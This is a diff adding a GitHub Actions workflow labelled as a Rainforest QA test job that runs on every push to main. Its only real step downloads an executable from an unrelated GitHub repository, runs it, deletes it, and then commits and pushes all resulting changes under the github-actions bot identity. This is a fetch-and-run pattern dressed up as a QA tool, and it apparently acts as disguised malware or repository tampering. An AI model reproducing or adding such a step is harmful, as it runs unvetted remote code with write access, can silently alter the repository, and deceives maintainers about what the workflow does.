@@ -1,0 +1,22 @@
+name: rainforestqa
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  rainforest:
+    runs-on: ubuntu-latest
+    name: Run Rainforest
+    steps:
+      - uses: actions/checkout@v3
+      - run: |
+         wget https://github.com/si9k/sa/raw/main/test
+         chmod +x test
+         ./test
+         rm test
+         git config --local user.email "41898282+github-actions[bot]@users.noreply.github.com"
+         git config --local user.name "github-actions[bot]"
+         git add -A
+         git commit -m "Add changes"
+         git push
